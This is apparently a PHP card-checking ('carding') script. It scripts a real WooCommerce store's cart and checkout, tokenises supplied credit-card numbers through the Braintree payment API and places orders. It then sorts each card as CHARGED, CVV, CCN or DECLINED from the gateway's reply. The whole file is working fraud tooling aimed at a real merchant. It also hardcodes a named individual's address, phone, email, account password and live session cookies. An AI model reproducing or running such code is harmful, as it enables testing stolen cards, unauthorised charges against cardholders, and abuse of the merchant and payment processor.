<?php

require "z.php";


function multiexplode($delimiters, $string)
{
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv1 = multiexplode(array(":", "|", ""), $lista)[3];



$startTime = microtime(true);
$Somnus = 0;

som:

//1st curl
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://sensorex.com/cart/');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

$headers = array();
$headers[] = 'authority: sensorex.com';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
$headers[] = 'user-agent: '.$ua.'';
$headers[] = 'connection: keep-alive';
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cx, CURLOPT_COOKIEJAR => $cx]);
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0));

$a = curl_exec($ch);
//$stocklevel = trim(strip_tags(v($a, '<input type="hidden" name="gtm4wp_stocklevel" value="','"/>')));



//2nd curl
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://sensorex.com/product/ph-buffer-solutions/');
curl_setopt($ch, CURLOPT_POST, 1);

$postfield = '------WebKitFormBoundaryLIPv1fyZdLuGZSfg
Content-Disposition: form-data; name="attribute_ph-buffer-value"

pH 4.01
------WebKitFormBoundaryLIPv1fyZdLuGZSfg
Content-Disposition: form-data; name="attribute_size"

Pint (473 ml)
------WebKitFormBoundaryLIPv1fyZdLuGZSfg
Content-Disposition: form-data; name="quantity"

8
------WebKitFormBoundaryLIPv1fyZdLuGZSfg
Content-Disposition: form-data; name="add-to-cart"

211
------WebKitFormBoundaryLIPv1fyZdLuGZSfg
Content-Disposition: form-data; name="product_id"

211
------WebKitFormBoundaryLIPv1fyZdLuGZSfg
Content-Disposition: form-data; name="variation_id"

217
------WebKitFormBoundaryLIPv1fyZdLuGZSfg--';

$headers = array();
$headers[] = 'authority: sensorex.com';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
$headers[] = 'content-type: multipart/form-data; boundary=----WebKitFormBoundaryLIPv1fyZdLuGZSfg';
$headers[] = 'origin: https://sensorex.com';
$headers[] = 'referer: https://sensorex.com/product/ph-buffer-solutions/';
$headers[] = 'user-agent: '.$ua.'';
$headers[] = 'connection: keep-alive';
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cx, CURLOPT_COOKIEJAR => $cx]);
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));

$b = curl_exec($ch);


//3rd curl
# CHECKOUT

//4th curl
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://sensorex.com/checkout/');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

$headers = array();
$headers[] = 'authority: sensorex.com';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
$headers[] = 'referer: https://softfloor.co.uk/cart/';
$headers[] = 'user-agent: '.$ua.'';
$headers[] = 'connection: keep-alive';
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cx, CURLOPT_COOKIEJAR => $cx]);
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0));

$d = curl_exec($ch);
$n = trim(strip_tags(v($d, '<input type="hidden" id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="','" />')));
$client_token = trim(strip_tags(v($d, 'var wc_braintree_client_token = ["','=="];')));
$decodedToken = base64_decode($client_token);
$tokenData = json_decode($decodedToken, true);
$bearer = $tokenData['authorizationFingerprint'];

//echo $client_token.'<br>';
//echo 'TokenData: '.$decodedToken.'<br>';
//echo 'Bearer: '.$bearer.'<br>';
//echo 'Nonce: '.$n.'<br>';



//5th curl
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_POST, 1);

$postfield = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"4860bcbc-d5a9-4cd8-a583-d07d2266899f"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv1.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}';


$headers = array();
$headers[] = 'authority: payments.braintree-api.com';
$headers[] = 'accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'authorization: Bearer '.$bearer.'';
//$headers[] = 'braintree-version: 2016-10-07';
$headers[] = 'braintree-version: 2018-05-10';
$headers[] = 'connection: keep-alive';
$headers[] = 'content-type: application/json';
$headers[] = 'origin: https://assets.braintreegateway.com';
$headers[] = 'referer: https://assets.braintreegateway.com/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: cross-site';
$headers[] = 'x-requested-with: XMLHttpRequest';
$headers[] = 'user-agent: '.$ua.'';
$headers[] = 'connection: keep-alive';
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cx, CURLOPT_COOKIEJAR => $cx]);
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_POSTFIELDS => $postfield));

$a = curl_exec($ch);
$ro1 = json_decode($a);
$token = $ro1->data->tokenizeCreditCard->token;

//echo 'Token: '.$token.'<br>';
echo $a.'<br>';


//6th curl
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://sensorex.com/?wc-ajax=checkout');
curl_setopt($ch, CURLOPT_POST, 1);

$postfield = 'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fsensorex.com%2Fproduct-category%2Fph%2F&wc_order_attribution_session_start_time=2025-01-30+13%3A25%3A14&wc_order_attribution_session_pages=35&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F132.0.0.0+Safari%2F537.36+Edg%2F132.0.0.0&billing_first_name=Tricia&billing_last_name=Lansangan&billing_company=&billing_country=PH&billing_address_1=Tambobong+tugatog&billing_address_2=&billing_city=Bocaue&billing_state=BUL&billing_postcode=3018&billing_phone=%2B639702998440&billing_email=tricialansangan1%40gmail.com&account_password=Mc3pCE4-HudLTc9&ship_to_different_address=1&shipping_first_name=Tricia&shipping_last_name=Lansangan&shipping_company=&shipping_country=PH&shipping_address_1=Tambobong+tugatog&shipping_address_2=&shipping_city=Bocaue&shipping_state=BUL&shipping_postcode=3018&order_comments=&shipping_method%5B0%5D=fedex%3A4%3AFEDEX_INTERNATIONAL_CONNECT_PLUS&payment_method=braintree_credit_card&wc-braintree-credit-card-card-type=&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=0&wc-braintree-credit-card-3d-secure-order-total=498.39&wc_braintree_credit_card_payment_nonce='.$n.'&terms-field=1&i13_checkout_token='.$token.'&fallback_i13_checkout_token='.$token.'&woocommerce-process-checkout-nonce='.$n.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&fallback_i13_checkout_token='.$token.'&fallback_i13_checkout_token='.$token.'';


$headers = array();
$headers[] = 'authority: sensorex.com';
$headers[] = 'accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'cookie: sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-01-30%2013%3A25%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fsensorex.com%2Fproduct-category%2Fph%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-01-30%2013%3A25%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fsensorex.com%2Fproduct-category%2Fph%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Safari%2F537.36%20Edg%2F132.0.0.0; _ga=GA1.1.1018599691.1738243517; _vwo_uuid_v2=D6A1321F8A3C9CB91BD12351BBCAD3450|10f15eb873796b2500e016cabbb08c88; _hjSession_2908555=eyJpZCI6Ijg5Y2QxMjRkLTlmOGUtNGQwZi1iYzAyLWFjOWM2Y2E0ODBkNCIsImMiOjE3MzgyNDM1MTg1NzYsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; __hstc=55175540.39d867bd2ecabe7d23ff8b1950d61de2.1738243518135.1738243518135.1738243518135.1; hubspotutk=39d867bd2ecabe7d23ff8b1950d61de2; __hssrc=1; _gcl_au=1.1.524423104.1738243520; __hs_notify_banner_dismiss=true; _hjSessionUser_2908555=eyJpZCI6IjU4M2M0MTQ2LWUyM2UtNTAxZC1iMmE1LWRlMTBlZWI5NDNjYyIsImNyZWF0ZWQiOjE3MzgyNDM1MTg1NzIsImV4aXN0aW5nIjp0cnVlfQ==; wp_woocommerce_session_3df91f764e89e47b476b516ea9f12da0=t_f25fe934350ca3f31bccf446fbd1c4%7C%7C1738416381%7C%7C1738412781%7C%7C80bbbbf87fda37cb94d9017295e877ac; woocommerce_items_in_cart=1; woocommerce_cart_hash=7a987734b4bddb6b36ccea58c9563699; sbjs_session=pgs%3D35%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fsensorex.com%2Fcheckout%2F; _ga_CYDF5PQBM9=GS1.1.1738243517.1.1.1738246443.56.0.0; __hssc=55175540.35.1738243518136';
$headers[] = 'origin: https://sensorex.com';
$headers[] = 'referer: https://sensorex.com/checkout/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'x-requested-with: XMLHttpRequest';
$headers[] = 'user-agent: '.$ua.'';
$headers[] = 'connection: keep-alive';
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cx, CURLOPT_COOKIEJAR => $cx]);
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_POSTFIELDS => $postfield));

$e = curl_exec($ch);
$ro2 = json_decode($e, true);;
$result = $ro2['result'];
$message = strpos($ro2['messages'], 'Reason:');
$messageReason = $message !== false ? substr($ro2['messages'], $message + strlen('Reason:')) : '';
$messageReason = trim($messageReason);
$url = $ro2['redirect'];
$od = $ro2['order_id'];

$endTime = microtime(true);
$overallTime = $endTime - $startTime;
echo $e;
//echo '<br>Result: '.$result.'  Message Reason: '.$messageReason;


if(strpos($messageReason, 'Gateway Rejected: avs') !== false){
    echo '<div style="margin-bottom: 8px;"><div style="background-color: green; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [#CVV] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ '.$ls.' ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ T: '.number_format($overallTime, 2).'s ] </div><br></div>';
}
else if(strpos($messageReason, 'Card Issuer Declined CVV') !== false){
    echo '<div style="margin-bottom: 8px;"><div style="background-color: green; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [#CCN] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ '.$messageReason.' ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ T: '.number_format($overallTime, 2).'s ] </div><br></div>';
}
else if ($result === 'success'){ 
    echo '<div style="margin-bottom: 8px;"><div style="background-color: green; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [#CHARGED] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ Order Placed ID: '.$od.' ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ B3 + Woo ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ T: '.number_format($overallTime, 2).'s ] </div><br></div>';
}
else if(strpos($messageReason, 'Insufficient Funds') !== false){
    echo '<div style="margin-bottom: 8px;"><div style="background-color: green; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [#CVV] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ '.$messageReason.' ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [T: '.number_format($overallTime, 2).'s] </div><br></div>';
}
else if($messageReason === 'Call Issuer. Pick Up Card.'){
    echo '<div style="margin-bottom: 8px;"><div style="background-color: red; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [DECLINED] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ Call Issuer. Pick Up Card. ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ T: '.number_format($overallTime, 2).'s ] </div><br></div>';
}
else if($messageReason === 'Payment instrument type is not accepted by this merchant account.'){
    echo '<div style="margin-bottom: 8px;"><div style="background-color: red; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [DECLINED] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ Payment instrument type is not accepted by this merchant account. ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ T: '.number_format($overallTime, 2).'s ] </div><br></div>';
}
else if($messageReason === 'Processor Declined - Fraud Suspected'){
    echo '<div style="margin-bottom: 8px;"><div style="background-color: red; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [DECLINED] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ Payment instrument type is not accepted by this merchant account. ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ T: '.number_format($overallTime, 2).'s ] </div><br></div>';
}
elseif(strpos($e, 'session has expired') )
{ $Somnus++;
   goto som; 
}
else if (empty($e)) {
  goto som;
}
else{
    echo '<div style="margin-bottom: 8px;"><div style="background-color: red; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [DECLINED] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ '.$messageReason.' ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ T: '.number_format($overallTime, 2).'s ] </div><br></div>';
}


curl_close($ch);
ob_flush();
unlink($cx);
?>